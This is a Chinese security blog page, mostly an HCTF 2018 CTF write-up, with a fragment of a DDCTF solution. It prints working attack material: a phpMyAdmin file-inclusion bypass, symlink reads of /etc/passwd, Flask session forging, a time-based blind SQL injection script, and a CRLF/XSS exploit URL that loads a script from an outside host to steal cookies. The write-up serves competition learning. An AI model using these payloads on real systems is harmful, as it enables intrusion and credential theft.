class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">		trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">	trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
<p>代码逻辑不难理解</p>
<p>解题思路是向 trigger_event 函数里传入数组，往队列里添加 get_flag,虽然页面得不到 flag 回显，但是 session 的 log 里会有记录</p>
<p>通过 <code>#</code>, eval 执行 trigger_event，也由 <code>#</code> 分割，传入buy_handler 和 get_flag </p>
<p>payload</p>
<p><code>http://116.85.48.107:5002/d5afe1f66147e857/?action:trigger_event%23;action:buy;10%23action:buy;10%23action:get_flag;0</code></p>
<p>flag : <code>DDCTF{3v41_3v3nt_100p_aNd_fLASK_c0Ok1e}</code></p>
<hr>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/02/jwt-notes/">JSON Web Token（JWT）初探</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JWT/">JWT</a></span><div class="content"><blockquote>
<p>JSON Web Token 是一个开放标准( RFC 7519 )，它定义了一种紧凑且独立的方式，以 JSON 对象的形式在各方之间安全地传输信息。</p>
</blockquote></div><a class="more" href="/2019/03/02/jwt-notes/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/02/17/SslNotAvailable/">有关python 3.7 pip 出现 TLS/SSL not available</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-02-17</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/python/">python</a></span><div class="content"><blockquote>
<p>最近重装了macOS，半夜用python3发现这问题，结果弄到两点半。。</p>
</blockquote></div><a class="more" href="/2019/02/17/SslNotAvailable/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/02/10/docker-notes/">Docker 靶机搭建</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-02-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/docker/">docker</a></span><div class="content"><blockquote>
<p>之前因为出题和测试，也会些 Docker，但本文将进行一个更系统、详细的学习</p>
</blockquote></div><a class="more" href="/2019/02/10/docker-notes/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/01/30/SSRF/">SSRF小结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-30</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/SSRF/">SSRF</a></span><div class="content"><blockquote>
<p>即恶意使用Web应用作为代理攻击其他本地或远程服务器的攻击方法，称其为服务端请求伪造攻击（Server-side Request Forgery），常用来探测内网，攻击内网应用</p>
</blockquote></div><a class="more" href="/2019/01/30/SSRF/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/01/21/AWD_Hunter/">AWD_Hunter</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-21</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Python-AWD/">Python AWD</a></span><div class="content"><p>基于Python2.7的AWD自动化工具</p></div><a class="more" href="/2019/01/21/AWD_Hunter/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/11/14/hctf2018/">HCTF 2018 WriteUp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-11-14</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><a id="more"></a>
<p>提目有难度，不过学到很多</p>
<h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>一个usb键盘的pcap包</p>
<p>利用王一航的脚本UsbKeyboardDataHacker提取数据, 但脚本有错误，看着改就好</p>
<p>得到</p>
<p><code>D&#39;`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa&#39;e^]\a`_X|V[Tx;:VONSRQJn1MFKJCBfFE&gt;&amp;&lt;`@9!=&lt;5Y9y7654-,P0/o-,%I)ih&amp;%$#z@xw|{ts9wvXWm3~</code></p>
<p>这是malbolge程序，在线跑下<a href="https://zb3.me/malbolge-tools/" target="_blank" rel="noopener">https://zb3.me/malbolge-tools/</a></p>
<p><code>hctf{m4lb0lGe}</code></p>
<h3 id="easy-dump"><a href="#easy-dump" class="headerlink" title="easy dump"></a>easy dump</h3><p>列出进程</p>
<p><code>./volatility_2.6_mac64_standalone -f ../../mem.data --profile=Win7SP1x64 pslist</code></p>
<p>查看mspaint.exe的ID</p>
<p><code>./volatility_2.6_mac64_standalone -f ../../mem.data --profile=Win7SP1x64 getsids | grep mspaint</code></p>
<p>转储mspaint.exe的内存</p>
<p><code>./volatility_2.6_mac64_standalone -f ../../mem.data --profile=Win7SP1x64 memdump -p 2768 --dump-dir=./</code></p>
<p>该为.data, 用GIMP将内存视为raw图片来看内存中的贴图</p>
<p>更改长宽得到图片再垂直翻转</p>
<p><img src="https://i.loli.net/2018/11/12/5be989e083699.png" alt="https://i.loli.net/2018/11/12/5be989e083699.png"></p>
<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>CVE-2018-12613 phpMyAdmin后台文件包含</p>
<p><a href="http://seaii-blog.com/index.php/2018/07/03/84.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2018/07/03/84.html</a></p>
<p>提示flag in ffffllllaaaagggg, source.php有源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第二次分割前会urldecode，我们把<code>?</code>进行两次urlencode，也就是<code>%253f</code>, 就能满足所有判断，此时<code>xxx.php%253f/</code>被当作目录，在后面加适当<code>../</code>即可包含想要的文件</p>
<p><img src="https://i.loli.net/2018/11/12/5be9909150a1a.png" alt="https://i.loli.net/2018/11/12/5be9909150a1a.png"></p>
<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>注册登陆，在change页面有注释<code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</code></p>
<p>查看源码, 在routes.py中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure>
<p>详情参考 Unicode安全 <a href="https://paper.tuisec.win/detail/a9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p>
<p>利用strlower函数<code>ᴬdmin -&gt;Admin -&gt; admin</code></p>
<p>strlower函数在注册、登陆、更改password时都有使用</p>
<p>即以<code>ᴬdmin</code>为用户名注册，改密码后再登陆可得到flag</p>
<p><img src="https://i.loli.net/2018/11/14/5beb8719298d7.png" alt="https://i.loli.net/2018/11/14/5beb8719298d7.png"></p>
<h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p><code>ln -s</code>软连接读文件,比如<code>/proc/self/environ</code>,<code>/etc/passwd</code></p>
<p>源码在<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure>
<p>其随机数种子<code>random.seed(uuid.getnode())</code></p>
<p>uuid.getnode()</p>
<blockquote>
<p>获取硬件的地址并以48位二进制长度的正整数形式返回，这里所说的硬件地址是指网络接口的MAC地址，如果一个机器有多个网络接口，可能返回其中的任一个。如果获取失败，将按照RFC 4122的规定将随机返回的48位二进制整数的第8位设置成1</p>
</blockquote>
<p>再读<code>/sys/class/net/eth0/address</code>得mac地址<code>12:34:3e:14:7c:62</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py decode -c eyJuYW1lIjoiYWRtaW4iLCJ1c2VybmFtZSI6InF3ZSJ9.DsvLsw.O0j4KKluGmdUCanKj3b2eUHYxJU</span><br><span class="line">&#123;&quot;name&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;qwe&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>本地得SECRET_KEY, 生成username为admin的session</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">random.seed(int(<span class="string">'12343e147c62'</span>,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] =  <span class="string">'11.935137566861131'</span> <span class="comment">#str(random.random()*100)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">u'admin'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello, %s&lt;/h1&gt;&lt;h2&gt;&lt;/h2&gt;'</span> % session[<span class="string">'name'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">7780</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p><code>session=.eJyrVspLzE1VslJKTMnNzFPSUSotTi1CEaoFANCMC7w.DsvL0w.NP2i5E0fKTL9Ph5HEiGPid5aZWA</code></p>
<p><img src="https://i.loli.net/2018/11/13/5bea3b2f6e6ce.png" alt="https://i.loli.net/2018/11/13/5bea3b2f6e6ce.png"></p>
<h3 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h3><p>会跳转到qq空间，目录扫描发现<a href="http://www.zip，admin/" target="_blank" rel="noopener">www.zip，admin/</a></p>
<p>进行代码审计，发现include/member.php中的sql查询未进行过滤</p>
<p>cookie传入的时候要进行json_decode，而json_decode会解unicode，可以利用unicode编码绕过WAF</p>
<p>如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$json = <span class="string">'&#123;"\u0075\u006e\u0069\u006f\u006e,":1,"b":2,"c":3&#125;'</span>;</span><br><span class="line">$j = json_decode($json,<span class="keyword">true</span>);</span><br><span class="line">print_r($j);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span> ( [union] =&gt; <span class="number">1</span> [b] =&gt; <span class="number">2</span> [c] =&gt; <span class="number">3</span> )</span><br></pre></td></tr></table></figure>
<p>原地址关了，本地起的docker</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url  =  <span class="string">'http://127.0.0.1:10000/admin/index.php'</span></span><br><span class="line">dic = <span class="string">''</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    dic += chr(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'dic is :'</span>+dic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\u00'</span>+str(i.encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    isok = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"admin' and if((substr((select binary F1a9 from F1444g),%d,1)='%s'),sleep(5),1)#"</span>.replace(<span class="string">' '</span>,<span class="string">'/**/'</span>) % (i,d)</span><br><span class="line">        data = <span class="string">'&#123;"admin_user":"'</span>+ encode(payload) +<span class="string">'","admin_pass":"1"&#125;'</span></span><br><span class="line">        cookies = &#123;<span class="string">'islogin'</span>:<span class="string">'1'</span>,<span class="string">'login_data'</span>:data&#125;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+]trying: '</span>+payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url,cookies=cookies).text</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt;= <span class="number">3</span>:</span><br><span class="line">            key += d</span><br><span class="line">            isok = <span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'update key :'</span>+key</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> isok == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*]:'</span>+key</span><br></pre></td></tr></table></figure>
<p><code>hctf{hctf_2018_kzone_Author_Li4n0}</code></p>
<h3 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h3><p>利用CSRF构造xss获取cookie</p>
<p>exp:</p>
<p><a href="http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%250aContent-Type:text/html%250aContent-Security-Policy:script-src%2520*%250a%250a%3Cscript/src=http://zzm.cat/1.js%3E%3C/script%3E" target="_blank" rel="noopener">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%250aContent-Type:text/html%250aContent-Security-Policy:script-src%2520*%250a%250a%3Cscript/src=http://zzm.cat/1.js%3E%3C/script%3E</a></p>
<h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>可以按照密码进行排序</p>
<p>注册新用户，密码逐位逐位与admin的密码比较，得到admin的密码</p>
